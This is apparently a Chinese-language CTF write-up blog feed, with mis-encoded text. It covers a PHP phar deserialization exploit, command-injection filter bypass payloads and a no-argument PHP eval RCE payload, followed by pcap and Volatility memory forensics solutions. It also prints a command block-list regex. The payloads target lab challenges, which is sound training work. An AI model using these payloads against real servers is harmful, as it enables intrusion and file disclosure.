class="keyword">$this</span>-&gt;img_name))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image not exsists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>public function __wakeup(){<br>        echo file_get_contents($this-&gt;filename);<br>    }</p><p>å› ä¸ºè¿™é‡Œå­˜åœ¨wakeupå‡½æ•°ï¼Œä½†æ˜¯åˆä¸å­˜åœ¨ååºåˆ—åŒ–çš„ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨pharååºåˆ—åŒ–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘ä»¬ä¸€èˆ¬åˆ©ç”¨ååºåˆ—æ¼æ´ï¼Œä¸€èˆ¬éƒ½æ˜¯å€ŸåŠ©unserialize()å‡½æ•°ï¼Œä¸è¿‡éšç€äººä»¬å®‰å…¨çš„æ„è¯†çš„æé«˜è¿™ç§æ¼æ´åˆ©ç”¨è¶Šæ¥è¶Šæ¥éš¾äº†ï¼Œä½†æ˜¯åœ¨2020å¹´8æœˆä»½çš„Blackhat2018å¤§ä¼šä¸Šï¼Œæ¥è‡ªSecarmaçš„å®‰å…¨ç ”ç©¶å‘˜Sam Thomasè®²è¿°äº†ä¸€ç§æ”»å‡»PHPåº”ç”¨çš„æ–°æ–¹å¼ï¼Œåˆ©ç”¨è¿™ç§æ–¹æ³•å¯ä»¥åœ¨ä¸ä½¿ç”¨unserialize()å‡½æ•°çš„æƒ…å†µä¸‹è§¦å‘PHPååºåˆ—åŒ–æ¼æ´ã€‚æ¼æ´è§¦å‘æ˜¯åˆ©ç”¨Phar:// ä¼ªåè®®è¯»å–pharæ–‡ä»¶æ—¶ï¼Œä¼šååºåˆ—åŒ–meta-dataå‚¨å­˜çš„ä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/flag&quot;</span>; <span class="comment">//è¦è¯»å–çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> upload();</span><br><span class="line">@unlink(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;shell.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œæ­¤æ–‡ä»¶ï¼Œä¼šç”Ÿæˆä¸€ä¸ªshell.pharæ–‡ä»¶ï¼Œç„¶åæˆ‘ä»¬å°†shell.pharï¼Œæ”¹ä¸ºjpgæ–‡ä»¶ä¸Šä¼ ä¸Šå»ï¼Œ<br>è·¯å¾„ä¸º  upload/shell.jpg</p><p>å€ŸåŠ©<code>phar://</code>æ‰§è¡Œä»£ç <br><code>img_name=phar://upload_file/phar.gif</code></p><h3 id="5-web-letmeguess-1"><a href="#5-web-letmeguess-1" class="headerlink" title="5_web_letmeguess_1"></a>5_web_letmeguess_1</h3><p>è€ƒç‚¹ï¼šå¼±å£ä»¤ï¼Œrceï¼Œè¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦/)ã€ ç©ºæ ¼</p><p>çˆ†ç ´ä¸€ä¸‹  adminï¼Œadmin123<br>è¿‡æ»¤çš„åˆ†éš”ç¬¦<code>linuxä¸­ä¸€äº›å‘½ä»¤åˆ†éš”ç¬¦ï¼š%0a ã€%0d ã€; ã€&amp; ã€| ã€&amp;&amp;ã€||</code><br>è¿‡æ»¤çš„ç©ºæ ¼ï¼Œå¯ä»¥ç”¨<code>%09(tab)ã€%09ã€ $&#123;IFS&#125;ã€$IFSã€$IFS$1ã€$&#123;IFS&#125;$ã€&lt;ã€&lt;&gt;è¿™äº›éƒ½å¯ä»¥å½“åšç©ºæ ¼ç¬¦ä½œä¸ºä»£æ›¿ã€‚</code><br>è¿‡æ»¤äº†catï¼Œå¯ä»¥ç”¨ <code>nlï¼Œnlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·</code><br><code>ip=%0anl%09index.php</code><br>å¯ä»¥è¯»å–æºç ï¼Œå¤ªé•¿ï¼Œè´´ä¸€ä¸‹å…³é”®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match_all(&quot;/(\||&amp;|;| |\/|cat|flag|touch|more|curl|scp|kylin|echo|tmp|var|run|find|grep|-|`|&#x27;|:|&lt;|&gt;|less|more)/&quot;, $ip, $m)) </span><br></pre></td></tr></table></figure><p><code>ip=%0als</code>  lsçš„æ—¶å€™æœ‰ä¸€ä¸ªkylinç›®å½•ï¼Œç›®å½•ä¸‹æœ‰ä¸€ä¸ªflag.txt ï¼Œä½†æ˜¯ä¸èƒ½è®¿é—®<br>ä¸”kylinï¼Œflagéƒ½è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬ç”¨é—®å·æ›¿æ¢å…¶ä¸­ä¸€ä¸ªå­—ç¬¦å³å¯<br>ç»•è¿‡ç›®å½•åˆ†éš”ç¬¦çš„è¯ï¼Œå…ˆcd åˆ°è¿™ä¸ªç›®å½•ï¼Œå†å»catå³å¯</p><p><code>/?ip=%0acd%09ky?in%0anl%09f?ag.txt</code><br>è§£æ³•ä¸å”¯ä¸€</p><blockquote><p>å‚è€ƒ pharååºåˆ—åŒ–<br><a href="https://www.cnblogs.com/zzjdbk/p/13030571.html">https://www.cnblogs.com/zzjdbk/p/13030571.html</a></p></blockquote><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> ç¬¬äº”ç©ºé—´ </tag>
            
            <tag> pharååºåˆ—åŒ–ï¼Œrce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cqgamectf-1</title>
      <link href="/2022/05/07/cqgamectf-1/"/>
      <url>/2022/05/07/cqgamectf-1/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z_]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/file|if|localeconv|phpversion|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|var_dump|pos|current|array|time|se|ord/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;What are you thinking?&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Please calm down&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=show_source(end(scandir(chr(ceil(sinh(cosh(tan(ceil(tan(ceil(zend_version())))))))))));</span><br></pre></td></tr></table></figure><p><img src="/images/cqgamectf-1/1.png" alt="image-20220402164521180"></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ— å‚æ•°rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OFPPT-CTF-2022-writeup</title>
      <link href="/2022/04/08/OFPPT-CTF-2022-writeup/"/>
      <url>/2022/04/08/OFPPT-CTF-2022-writeup/</url>
      
        <content type="html"><![CDATA[<h3 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h3><h4 id="pcap-analysis1"><a href="#pcap-analysis1" class="headerlink" title="pcap analysis1"></a>pcap analysis1</h4><p>è€ƒç‚¹:æµé‡åˆ†æ</p><p><a href="/images/ofppt-ctf-2022/pcap-analysis.7z">æµé‡åŒ…ä¸‹è½½</a></p><p>ç¬¬ä¸€é¢˜ï¼Œå› ä¸ºè‹±è¯­å¤ªèœäº†ï¼Œè¿™é‡Œç¿»è¯‘ä¸€ä¸‹ï¼Œå¤§è‡´çš„æ„æ€å°±æ˜¯è¢«å…¥ä¾µäº†ï¼Œç„¶ååˆ†æä¸€ä¸‹ï¼Œè¿™ä¸ªäººåœ¨æœç´¢å¼•æ“ä¸ŠæŸ¥æ‰¾äº†ä»€ä¹ˆ</p><p><img src="/images/ofppt-ctf-2022/1.png" alt="image-20220408210409793"></p><p>æˆ‘ä»¬è¿™é‡Œç›´æ¥ç­›é€‰httpæµé‡ï¼Œéšä¾¿ç‚¹ä¸€ä¸ªï¼Œçœ‹åˆ°ä½¿ç”¨çš„æ˜¯ç™¾åº¦ï¼Œéšä¾¿æœç´¢ä¸€ä¸ªåå­—ï¼Œå°±å¯ä»¥çœ‹åˆ°ï¼Œwdå¯¹åº”çš„å€¼å°±æ˜¯æˆ‘ä»¬æœç´¢çš„å†…å®¹ï¼Œ</p><p><img src="/images/ofppt-ctf-2022/2.png" alt="image-20220408211238126"></p><p><img src="/images/ofppt-ctf-2022/3.png" alt="image-20220408211344064"></p><p><img src="/images/ofppt-ctf-2022/4.png" alt="image-20220408211438318"></p><p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥ç”¨ç®€å•æ–¹æ³•ï¼Œæ–‡ä»¶å¯¼å‡ºé¦–é€‰é¡¹ï¼Œä¸‹é¢æœ‰å…¨éƒ¨çš„urlï¼Œè¿™é‡Œç›´æ¥æŠ„å°±è¡Œäº†ã€‚</p><p><img src="/images/ofppt-ctf-2022/5.png" alt="image-20220408212025332"></p><p>OFPPT-CTF{charles_geschickter}</p><h4 id="pcap-analysis2"><a href="#pcap-analysis2" class="headerlink" title="pcap analysis2"></a>pcap analysis2</h4><p>wiresharkæå–ftpæµé‡åŒ…</p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è®¸å¤šftpçš„åè®®ï¼Œæˆ‘ä»¬ç›´æ¥å¸…é€‰ftpçš„æµé‡ï¼Œå¾€ä¸‹ç¿»ä¸€ç•ªï¼Œéšä¾¿æ‰¾ä¸ªrequeståŒ…ï¼Œå³é”®è¿½è¸ªæµå°±å¯ä»¥çœ‹åˆ°äº†ï¼Œ</p><p><img src="/images/ofppt-ctf-2022/6.png" alt="image-20220408212631031"></p><p>å› ä¸ºé¢˜ç›®çš„è¦æ±‚æ˜¯ç›¸åŒæ–‡ä»¶åï¼Œåç¼€ä¸åŒï¼Œæ‰€ä»¥å°±æ˜¯è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œæ¥ä¸‹æ¥æå–è¿™ä¸¤åŒ…</p><p><img src="/images/ofppt-ctf-2022/7.png" alt="image-20220408212848843"></p><p>è¿™é‡Œç›´æ¥æœç´¢lytton-crypt.binä¸‹é¢ftpdataå°±æ˜¯æ•°æ®ï¼Œç›´æ¥è¿½è¸ª</p><p><img src="/images/ofppt-ctf-2022/8.png" alt="image-20220408213524053"></p><p>è°ƒæˆåŸå§‹æ•°æ®ï¼Œsave</p><p><img src="/images/ofppt-ctf-2022/9.png" alt="image-20220408213738041"></p><p>lytton-crypt.bin</p><p>MD5: 4da8e81ee5b08777871e347a6b296953<br>SHA1: 5f88cfb5e469154782aa84a6b649007423c8b196<br>SHA256: 22190203d1789b181eb7230ceeafffe440b33883e185470b7cf64ab22fb3ba9f<br>CRC32: 2859590343</p><p>lytton-crypt.exe åŒç†</p><p><img src="/images/ofppt-ctf-2022/10.png" alt="image-20220408213950236"></p><p>MD5: 9cb9b11484369b95ce35904c691a5b28<br>SHA1: 4463adb39c4381b87c76180543c401c2bfa89962<br>SHA256: b7da7228ac44bd90aedf34660a04d15bf1ddf84c1a4823234c3abf506a254b8b<br>CRC32: 3745826804</p><blockquote><p>OFPPT-CTF{9cb9b11484369b95ce35904c691a5b28|4da8e81ee5b08777871e347a6b296953}</p></blockquote><h4 id="pcap-analysis3"><a href="#pcap-analysis3" class="headerlink" title="pcap analysis3"></a>pcap analysis3</h4><p>The attacker cracked a password belonging to the victim. Submit the flag as: OFPPT-CTF{password}.</p><p>è¿™é¢˜å°±æ¯”è¾ƒç®€å•äº†ï¼Œè¯´æ”»ç ´äº†å¯†ç ï¼Œæˆ‘ä»¬åˆšåˆšåœ¨ftpæœåŠ¡å™¨ä¸Šçœ‹åˆ°äº†ç™»é™†çš„ç—•è¿¹ï¼Œå»æ‰¾ä¸€ä¸‹å¯†ç ï¼Œç›´æ¥æœç´¢tcpå’Œ200å°±è¡Œï¼Œæˆ–è€…utf8ä¹Ÿå¯ä»¥ï¼Œè¿½è¸ªä¸€ä¸‹ï¼Œå°±å¯ä»¥çœ‹åˆ°ç™»å½•æˆåŠŸäº†</p><p><img src="/images/ofppt-ctf-2022/11.png" alt="image-20220408215301907"></p><p><img src="/images/ofppt-ctf-2022/12.png" alt="image-20220408215400191"></p><p>USER cgeschickter</p><p>331 Password required</p><p>PASS darkangel</p><p>230 User logged in.</p><blockquote><p>OFPPT-CTF{darkangel}</p></blockquote><h4 id="pcap-analysis4"><a href="#pcap-analysis4" class="headerlink" title="pcap analysis4"></a>pcap analysis4</h4><p>4è¿™é‡Œè¯´æ‰§è¡Œäº†ä¸€ä¸ªæ–‡ä»¶<br>The attacker made a fatal mistake, and in doing so, gave control of his computer toâ€¦ someone. he shouldnâ€™t have run that malicious program.</p><p>æˆ‘ä»¬åœ¨æœç´¢httpæµé‡æ—¶ï¼Œæ‰¾åˆ°ä¸€ä¸ªsecret_decoder.binï¼Œæœç´¢è¿™ä¸ªå…³é”®å­—æ—¶ï¼Œå‘ç°</p><p><img src="/images/ofppt-ctf-2022/13.png" alt="image-20220408215914265"></p><p><img src="/images/ofppt-ctf-2022/14.png" alt="image-20220408220108310"></p><p>.106çš„æœºå™¨åœ¨105ä¸Šæ‰§è¡Œäº†å‘½ä»¤</p><p><strong>ä½¿ç”¨wget -Oä¸‹è½½å¹¶ä»¥ä¸åŒçš„æ–‡ä»¶åä¿å­˜</strong></p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°wgetäº†ä¸€ä¸ªæ–‡ä»¶ä¸”é‡å‘½åäº†ï¼Œä¹‹åæ”¹äº†æƒé™ï¼Œç„¶åå¢åŠ äº†å®šæ—¶ä»»åŠ¡ï¼Œè¯´æ˜æ‰§è¡Œçš„å°±æ˜¯è¿™ä¸ªsecret_decoder.binæ–‡ä»¶</p><p><img src="/images/ofppt-ctf-2022/15.png" alt="image-20220408220220107"></p><p>è¿™é‡Œå› ä¸ºä»–åœ¨æœ€åhttpè¯·æ±‚äº†è¿™ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬ç›´æ¥å¯¼å‡ºå°±è¡Œ,å’Œftpå¯¼å‡ºä¸€æ ·.</p><p><img src="/images/ofppt-ctf-2022/16.png" alt="image-20220408220615646"></p><p>å¯¼å‡ºä¹‹åå–ä¸€ä¸‹æ–‡ä»¶md5å°±è¡Œäº†</p><p>MD5: 42e419a6391ca79dc44d7dcef1efc83b<br>SHA1: e96c5e687d827f5a250fc643d1e9ff46e2c531bc<br>SHA256: 358489fcab70c3f10c4628e09c1ccbd001915f6adfa7fa97a1be0fb5fbab8198<br>CRC32: 2929409365</p><p><img src="/images/ofppt-ctf-2022/17.png" alt="image-20220408205826205"><br><img src="/images/ofppt-ctf-2022/18.png" alt="image-20220408205858332"></p><blockquote><p>OFPPT-CTF{42e419a6391ca79dc44d7dcef1efc83b}</p></blockquote><h4 id="pcapanalysis5"><a href="#pcapanalysis5" class="headerlink" title="pcapanalysis5"></a>pcapanalysis5</h4><p>The attacker started by performing a port scan of the victim computer.<br>Identify the open TCP ports discovered on the victimâ€™s machine? Enter the flag as the open ports, separated by commas, no spaces, in numerical order. Disregard port numbers &gt; 10000. Example: OFPPT-CTF{80,110,111,143,443,2049} Use the PCAP file from â€˜pcap analysisâ€™ challenge.</p><p>è¿™é‡Œæˆ‘ä»¬å…ˆæ¨æ–­ä¸€ä¸‹ï¼Œå› ä¸ºåœ¨æ•°æ®åŒ…ä¸­106çš„ipå¯¹103çš„ipè¿›è¡Œäº†ftpå¯†ç çˆ†ç ´ï¼Œæ‰€ä»¥106ä¸ºæ”»å‡»è€…ï¼Œ103ä¸ºå—å®³è€…ä¸”å‡è®¾çš„ä¸ºftpæœåŠ¡ã€‚<br>ç­›é€‰ä¸€ä¸‹ç›®çš„ip<code>ip.dst == 192.168.100.103</code></p><p><img src="/images/ofppt-ctf-2022/19.png" alt="image-20220409211513430"></p><p><img src="/images/ofppt-ctf-2022/20.png" alt="image-20220409212805266"></p><p>å¯ä»¥çœ‹åˆ°åœ¨æ‰«æç«¯å£ï¼Œå¾€ä¸‹æ‹‰ä¸€æ‹‰ä¼šçœ‹åˆ°è¯·æ±‚æˆåŠŸçš„ç«¯å£ï¼Œä¸€å…±æœ‰äº”ä¸ªã€‚è¿™é‡Œæˆ‘çš„æ–¹æ³•ä¸æ¨èï¼Œä¸‹é¢è¿™ä¸ªæ˜¯ä¸€ä¸ªå¤§å¸ˆå‚…çš„æ–¹æ³•ï¼Œé“¾æ¥<code>https://hhyleung.github.io/writeups/ofppt-ctf-2022/#pcap-analysis-6</code></p><p><img src="/images/ofppt-ctf-2022/21.png" alt="image-20220409213029038"></p><blockquote><p>A port scan is usually done with the TCP handshake, which ends with <code>SYN, ACK</code> if the port is opened. &gt;The filter <code>tcp.flags.ack == 1 and tcp.flags.syn == 1</code> was used to filter out the completed &gt;handshakes and it was found that ports <code>21</code>, <code>135</code>, <code>139</code>, <code>445</code>, and <code>3389</code> were opened.</p></blockquote><p>åŠ ä¸Šipå°±æ›´æ¸…æ™°äº†<code>tcp.flags.ack == 1 and tcp.flags.syn == 1 and ip.addr == 192.168.100.103</code></p><p><img src="/images/ofppt-ctf-2022/22.png" alt="image-20220409214123092"></p><blockquote><p>OFPPT-CTF{21,135,139,445,3389} </p></blockquote><h4 id="pcap-analysis6"><a href="#pcap-analysis6" class="headerlink" title="pcap analysis6"></a>pcap analysis6</h4><p>The attacker might have just bit off more than he can chew! he encountered a competitor that is counter-attacking his system!<br>The competitor executed a command to attain persistence on the attackerâ€™s computer. This command will allow the adversary to regain a connection to the computer even after reboot. What is the packet number where this command was executed? For example: OFPPT-CTF{93721}. Use the PCAP file from â€˜pcap analysisâ€™ challenge.</p><p>å‰é¢æˆ‘ä»¬çŸ¥é“åŠ äº†è®¡åˆ’ä»»åŠ¡ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥æœsudo å°±å¯ä»¥äº†ï¼Œè¯¥åŒ…çš„å·ä¸º160468</p><p><img src="/images/ofppt-ctf-2022/23.png" alt="image-20220409214555530"></p><blockquote><p>OFPPT-CTF{160468} </p></blockquote><h4 id="Windows-memory-dump"><a href="#Windows-memory-dump" class="headerlink" title="Windows memory dump"></a>Windows memory dump</h4><p>A Windows computer has been infected. The attacker managed to exploit a portion of a database backup that contains sensitive employee and customer private information. All memory dump challenges use the same file.<br>Inspect the memory dump and tell us the Windows Major Operating System Version, bit version, and the image date/time (UTC, no spaces or special characters). Submit the flag as OFPPT-CTF{OS_BIT_YYYYMMDDhhmmss}. Example: OFPPT-CTF{WindowsXP_32_20220120095959} File: 1.5 GB Decompressed: 5 GB</p><p>è¿™é‡Œå–è¯é¢˜ï¼Œç¬¬ä¸€æ¬¡é‡åˆ°win10çš„é•œåƒï¼Œè®°å½•ä¸€ä¸‹</p><p>å…ˆçœ‹ä¸€ä¸‹é•œåƒä¿¡æ¯<code>â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility] â””â”€# python2 vol.py -f ../ctf/ofppt/physmemraw imageinfo</code><br>ç”±äºè¿™ä¸ªæ–‡ä»¶å¾ˆå¤§ 5G,æ‰«ææ‰«äº†å¾ˆä¹…ï¼ŒæŸ¥ä¸å¤šäº”åˆ†é’Ÿï¼Œæˆ‘ä¸€åº¦ä»¥ä¸ºæ˜¯æˆ‘æ“ä½œä¸å¯¹ã€‚åæ¥å‘ç°ä¸æ˜¯ï¼Œå•çº¯çš„æ˜¯å› ä¸ºæ–‡ä»¶å¤§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€<span class="comment"># python2 vol.py -f ../ctf/ofppt/physmemraw imageinfo</span></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win10x64_19041</span><br><span class="line">                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/tools/ctf/ofppt/physmemraw)</span><br><span class="line">                      PAE <span class="built_in">type</span> : No PAE</span><br><span class="line">                           DTB : 0x1aa000L</span><br><span class="line">                          KDBG : 0xf8005e600b20L</span><br><span class="line">          Number of Processors : 4</span><br><span class="line">     Image Type (Service Pack) : 0</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 0 : 0xfffff8005ba60000L</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 1 : 0xffff82804f9c0000L</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 2 : 0xffff82804f5e8000L</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 3 : 0xffff82804f7ca000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class="line">           Image date and time : 2021-09-07 14:57:44 UTC+0000</span><br><span class="line">     Image <span class="built_in">local</span> date and time : 2021-09-07 07:57:44 -0700</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯64ä½çš„win10ï¼Œæ‰€ä»¥flag</p><blockquote><p>OFPPT-CTF{Windows10_64_20210907145744} </p></blockquote><h4 id="Windows-memory-dump2"><a href="#Windows-memory-dump2" class="headerlink" title="Windows memory dump2"></a>Windows memory dump2</h4><table><thead><tr><th>envars</th><th>æ˜¾ç¤ºè¿›ç¨‹çš„ç¯å¢ƒå˜é‡</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€# python2 vol.py -f ../ctf/ofppt/physmemraw --profile=Win10x64_19041 envars | grep COMPUTE</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">     568 wininit.exe          0x000002760e625ed0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     644 winlogon.exe         0x000002a6290b71e0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     668 services.exe         0x0000018faf8027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     708 lsass.exe            0x00000234422027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     832 svchost.exe          0x000001e39d6027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     952 svchost.exe          0x000001c6c2e027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     996 svchost.exe          0x000002da882027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     428 dwm.exe              0x0000019f91800fe0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br></pre></td></tr></table></figure><blockquote><p>OFPPT-CTF{DESKTOP-IT8QNRI}</p></blockquote><h4 id="Windows-memory-dump3"><a href="#Windows-memory-dump3" class="headerlink" title="Windows memory dump3"></a>Windows memory dump3</h4><p>Using the memory dump file from Window memory dump challenge, find out the name of the malicious process.<br>Submit the flag as OFPPT-CTF{process-name_pid} (include the file extension). Example: OFPPT-CTF{svchost.exe_1234}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€# python2 vol.py -f ../ctf/ofppt/physmemraw --profile=Win10x64_19041 pstree                                                                         130 â¨¯</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Name                                                  Pid   PPid   Thds   Hnds Time</span><br><span class="line">-------------------------------------------------- ------ ------ ------ ------ ----</span><br><span class="line"> 0xffff9a077fead080:wininit.exe                       568    456      1      0 2021-09-07 14:24:53 UTC+0000</span><br><span class="line">. 0xffff9a077ff1d080:lsass.exe                        708    568     13      0 2021-09-07 14:24:55 UTC+0000</span><br><span class="line">. 0xffff9a077ff54140:fontdrvhost.ex                   864    568      5      0 2021-09-07 14:24:55 UTC+0000</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"> 0xffff9a07843ab080:userinit.exe                     8180   2252      3      0 2021-09-07 14:55:55 UTC+0000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€# python2 vol.py -f ../ctf/ofppt/physmemraw --profile=Win10x64_19041 cmdline | grep 8180</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">userinit.exe pid:   